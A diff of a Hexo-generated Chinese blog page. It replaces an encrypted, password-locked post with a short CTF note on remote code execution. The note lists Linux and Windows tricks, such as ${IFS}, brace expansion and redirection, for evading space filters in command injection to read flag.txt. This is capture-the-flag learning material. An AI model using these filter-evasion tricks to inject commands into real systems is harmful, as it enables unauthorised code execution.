@@ -47,14 +47,14 @@
   };
 </script>
 
-  <meta name="description" content="Welcome to my blog, enter password to read.">
+  <meta name="description" content="CTF RCE(远程代码执行)命令中空格被过滤的解决方法linux {cat,flag.txt}cat${IFS}flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txtcat&amp;lt;&amp;gt;flag.txtkg=$’\x20flag.txt’&amp;amp;&amp;amp;cat$kg(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF RCE(远程代码执行)">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;13&#x2F;CTF-RCE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&#x2F;index.html">
 <meta property="og:site_name" content="NoObject&#39;s blog">
-<meta property="og:description" content="Welcome to my blog, enter password to read.">
+<meta property="og:description" content="CTF RCE(远程代码执行)命令中空格被过滤的解决方法linux {cat,flag.txt}cat${IFS}flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txtcat&amp;lt;&amp;gt;flag.txtkg=$’\x20flag.txt’&amp;amp;&amp;amp;cat$kg(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-07-10T01:26:59.626Z">
+<meta property="og:updated_time" content="2020-09-08T11:19:27.466Z">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://yoursite.com/2020/05/13/CTF-RCE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
@@ -216,7 +216,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-10 09:26:59" itemprop="dateModified" datetime="2020-07-10T09:26:59+08:00">2020-07-10</time>
+                <time title="修改时间：2020-09-08 19:19:27" itemprop="dateModified" datetime="2020-09-08T19:19:27+08:00">2020-09-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -244,20 +244,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<div id="hbe-security">
-  <div class="hbe-input-container">
-  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read.">
-    <label for="pass">Welcome to my blog, enter password to read.</label>
-    <div class="bottom-line"></div>
-  </div>
-</div>
-<div id="decryptionError" style="display: none;">Incorrect Password!</div>
-<div id="noContentError" style="display: none;">No content to display!</div>
-<div id="encrypt-blog" style="display:none">
-U2FsdGVkX19Sqgfm0rokEzXrJgXrQRMVkusCgwHgcuVj4xpxs4dQbMlyU0o9PAqtqcjqnVKWr79Mo7Ts94OQKOCbqmZQOjvDi7ibpTN3djqqDSfo4qx64u2yAa5MX24cCuMgSWW83p+LqxTfwnfdgnEwCQu6uH6nGjNedZbhZPQlva488/+pfxbcvdwkVOlf5EKqwrEC3wWlgnpPIcR7CrEkZwspCyUBuWZodCAG+HS1ttuguvfiFt+fAekwlBNHp/j8fw5v1omQpBJz3OK4ECY95oY+qOGL0p8ncxuAN42qmqbN80sRNudn9/ZXkSN2Q1eCfW9YsJve9gfFlVbt/sm7q2Zv1NHRabrANlBlB/DQTvE7lFb9iCsIk7IshDQ4nqhBFzEHKJu6tpD6OkgXWHZaKtHwBng+2/1AZmUTQgi3voSMnMS6u4aAw7gQjQ3A2nE8+TZ5S77LZXOINjq+wdldm0eU7m1ciBmCYGDsdwPT5L+nuhn0RwB+oZDK1jje4N0zotn5McHhw+gvMf9LqjvTeI8E55lIywEQx14pYOnj5BlC0u3txLl1aEhTVfxlsiec8KXyb0eu56IKS4oKotOX+CQosI1pjBivAsIHM6FMcgcoPGURobu4uT7rZvXH7IMkzm6ISdKlrilgqhinj3A39wWwoMRE9SL6Z+t4HT6TFAbKwgtgKvesHtbGCuMlSlsQXdjPNHW2BMzGOqYwn+hIpfdcp/TCwk4OLSS04BKdPOmzF14QOD2Pbpj1zn0btP8nOyPvwNtYXkUFwZM/yuQpIlF1OZEanfVZCvYdYuhFDlk1wQU4OEh2b1c5a/vlIyB+7FFqua780AX+iLXytsZk8Qnq8IvS6LmRYCrydF8swG4ZtW966tgbAhngafFaWqIm92RQJmv3TEZnvJ+AYw9NYwe28J1MuMwsdAcSK+d6zX+eZjgI0Wb8aqOEJPVCbbHdIMyaPKq1jEWszUnQ01JGw/sWOqB7KfOxwbImNLxqbDsYPFYlQUOGQGpSEaceLlwo6zla6OtqHbgehRmQd3nrzzpax25T1F05Ey4QULPy3xFi88PfWWIZKVcd/5jty8Ys14KZBn82hPtHnTlw/5aMj9ldH8zKvsVakl5zr/urfno6twNKyITLA1CYrpw4KUwgBAM+pm91RYIBSx9tQXBOCpYpbIDu1RYh62Fktp6P6E2vLJJcRCpVpgNgZTwrhRadwRR1QpeIvrPX6bhbNrBCRNhvnPNwJNSXS6jnwBes8GPD20lHxWsJa9zRA6laPLpOUOvkXidG8HKYmmkHqW9H506pxyDkqi0wDgegz2FsYqYCK+792LqU5Qeg8u91b5F5FekfMwX5A1SFSg7/jgfhBTBHRxD4EsUF0PNZDtKQHFyRFd+8B66MRZo5fx9GXeXxIiI2Pjmbzqawd+bHze/AR0egv7NC4Jld66KNqEr1ngAPkx0RQdozX34KGXM+Cu2JY3CaRZhUA1J10mZwZRo0vHVp6hg7oufvBxgN9KHZx+kyAPWFAdXFSMSpEZ18Tsq9auhYItouoHPHm8CXKFex2vyc/cbTnWKWu+uh/2mXIszL3oxOI4w4XcoZyQ5ixWzJPwVpdAWP+ngCCFdceOrDJctqv+v7e416ogZzKLAKwB+wfKDx6c5nV7vr6zdqtS+Fu+ZuOuuPUUOh7g0UXW9frgIWjUXdB0rvvcE+WrdoIf6hKSQvNp3IXAaGdcvr2Ag63ZsQ6TvzdP6EGLhoeGBFnaErkTVQuACY2K6znYDQMLWhKOW3O4PrCaurlYLCJkCpf5+sczAGVLofUlbuTWbNt9dykH62zSiOhBCXNipymKFfk6t/CR6q/AnG7xIRKILvydMIFt+7HGAhNahnbFFfM4p1QEzYSnXLLMwF1cuotSML8SwSZ9VsCLgv9imNzd64zb1/AnakcrDXkvjP3QS4a7WUI6Ov9n8F5DMbkldCvMAYIQZRfgr48zD6Yak/6M56Tgjmxcms6MVG6lK6DFlhd4VXyulPPYRYi4xcC/i0BqCl0nrfcnHGcoqTAwzdt8wbq2SOirCoW0r5B8k6jQQ+MIkO6qs/BgU1yvWqZu2CSJKO4XFB+BsO9K3fh8zmUQKjJr+G6OnVr0i3EaVq+vfWQHmy8VoBbvT/XSlAtRK+y9D0Ky2NBeaTQwqxRbEZ3RF/vN0hSnVJVHdfGD2DMZclyVko/KHzHe2IftZqwI4=
-</div>
-<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
+        <p><a href="https://www.cnblogs.com/20175211lyz/p/11396392.html" target="_blank" rel="noopener">CTF RCE(远程代码执行)</a></p><h1 id="命令中空格被过滤的解决方法"><a href="#命令中空格被过滤的解决方法" class="headerlink" title="命令中空格被过滤的解决方法"></a>命令中空格被过滤的解决方法</h1><p>linux</p><blockquote>
+<p>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg=$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
+</blockquote><a id="more"></a>
+
+
+<p>windows下</p>
+<blockquote>
+<p>type.\flag.txt<br>type,flag.txt<br>echo,123456</p>
+</blockquote>
+
     </div>
 
     
@@ -328,6 +324,7 @@ U2FsdGVkX19Sqgfm0rokEzXrJgXrQRMVkusCgwHgcuVj4xpxs4dQbMlyU0o9PAqtqcjqnVKWr79Mo7Ts
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#命令中空格被过滤的解决方法"><span class="nav-number">1.</span> <span class="nav-text">命令中空格被过滤的解决方法</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -343,7 +340,7 @@ U2FsdGVkX19Sqgfm0rokEzXrJgXrQRMVkusCgwHgcuVj4xpxs4dQbMlyU0o9PAqtqcjqnVKWr79Mo7Ts
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-count">39</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -394,7 +391,7 @@ U2FsdGVkX19Sqgfm0rokEzXrJgXrQRMVkusCgwHgcuVj4xpxs4dQbMlyU0o9PAqtqcjqnVKWr79Mo7Ts
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共22.6k字</span>
+  <span class="post-count">博客全站共30.2k字</span>
 </div>
 <br>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
